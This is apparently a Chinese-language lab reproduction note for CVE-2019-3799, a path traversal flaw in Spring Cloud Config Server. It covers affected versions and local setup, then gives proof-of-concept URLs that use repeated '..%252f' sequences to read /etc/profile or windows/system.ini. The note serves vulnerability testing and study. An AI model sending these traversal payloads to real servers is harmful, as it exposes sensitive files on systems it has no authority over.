# Spring Cloud Config CVE-2019-3799 路径穿越漏洞测试

## 简介

由于 spring-cloud-config-server 模块未对传入路径进行安全限制，攻击者可以利用多个 `..%252f` 进行目录遍历，查看服务器其他路径的敏感文件，造成敏感信息泄露。

## 影响范围

```
Spring Cloud Config 2.1.0 - 2.1.1
Spring Cloud Config 2.0.0 - 2.0.3
Spring Cloud Config 1.4.0 - 1.4.5
```

## 环境搭建

以 2.1.0 版本为例，从官方 Git 仓库下载 `v2.1.0.RELEASE` 版本：

https://github.com/spring-cloud/spring-cloud-config/archive/v2.1.0.RELEASE.zip

然后，用 `Intelli IDEA` 以项目方式打开 `spring-cloud-config-server` 目录下的 `pom.xml` 文件，成功打开 spring-cloud-config-server 项目，点击 Maven 侧边栏的 `Reimport All Maven Projects`，稍等片刻后，找到文件 `spring-cloud-config-server\src\main\java\org\springframework\cloud\config\server\ConfigServerApplication.java`，右击选择 `Run ...`（或使用快捷键 Control + Shift + F10）。

项目启动成功后，通过浏览器即可访问。

```
http://127.0.0.1:8888/
```

## 漏洞验证

根据漏洞原理分析，漏洞利用 URL 格式如下：

```
/{name}/{profile}/{label}/{path}
```

其中 `{path}` 是发生路径穿越的部分，可以通过 `..%252f` 实现路径穿越。

最终，该漏洞的验证 POC 如下：

```
# Linux
/a/b/master/..%252f..%252f..%252f..%252f../etc/profile

# Windows
/a/b/master/..%252f..%252f..%252f..%252f../windows/system.ini
# 仅在应用文件位于 C 盘下时该路径才有效，如果是其它盘，则需要猜测存在的文件名及路径
```

**注意** `{label}` 参数建议使用 `master` 或 `test`， 否则可能收到如下错误提示：

```
No such label:
```

## 参考资料

- https://xz.aliyun.com/t/4844
- https://github.com/jinqi520/pocsuite3_jinqi/blob/6bdfb4d254b1fe9d15718c471d8ebacd2d942644/pocsuite3/pocs/spring_cloud_config_lfr.py
- 

